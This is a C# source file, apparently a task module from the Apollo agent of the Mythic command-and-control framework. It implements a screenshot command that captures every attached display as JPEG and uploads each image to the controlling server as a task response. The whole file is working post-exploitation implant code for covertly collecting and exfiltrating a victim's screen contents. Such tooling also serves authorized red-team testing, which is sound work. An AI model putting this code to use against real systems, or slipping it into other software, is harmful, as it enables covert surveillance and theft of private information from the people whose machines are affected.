#define COMMAND_NAME_UPPER

#if DEBUG
#define SCREENSHOT
#endif

#if SCREENSHOT
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ST = System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing;
using System.IO;

namespace Tasks
{
    public class screenshot : Tasking
    {
        public screenshot(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
        {
        }


        public override void Start()
        {
            TaskResponse resp = CreateTaskResponse("", true);
            List<byte[]> captures = new List<byte[]>();
            foreach (Screen sc in Screen.AllScreens)
            {
                byte[] bScreen = GetBytesFromScreen(sc);
                captures.Add(bScreen);
            }

            foreach (byte[] bScreen in captures)
            {
                if (!_agent.GetFileManager().PutFile(
                        _cancellationToken.Token,
                        _data.ID,
                        bScreen,
                        null,
                        out string mythicFileId,
                        true))
                {
                    resp = CreateTaskResponse("", true, "error");
                    break;
                }
                else
                {
                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                        mythicFileId, false, ""));
                }
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            // Your code here..
            // Then add response to queue
            // _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }

        private byte[] GetBytesFromScreen(Screen screen)
        {
            byte[] bScreen = null;
            using (Bitmap bmpScreenCapture = new Bitmap(screen.Bounds.Width,
                                            screen.Bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bmpScreenCapture))
                {
                    g.CopyFromScreen(screen.Bounds.X,
                                        screen.Bounds.Y,
                                        0, 0,
                                        bmpScreenCapture.Size,
                                        CopyPixelOperation.SourceCopy);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        bmpScreenCapture.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                        bScreen = ms.ToArray();
                    }
                }
            }

            return bScreen;
        }
    }
}
#endif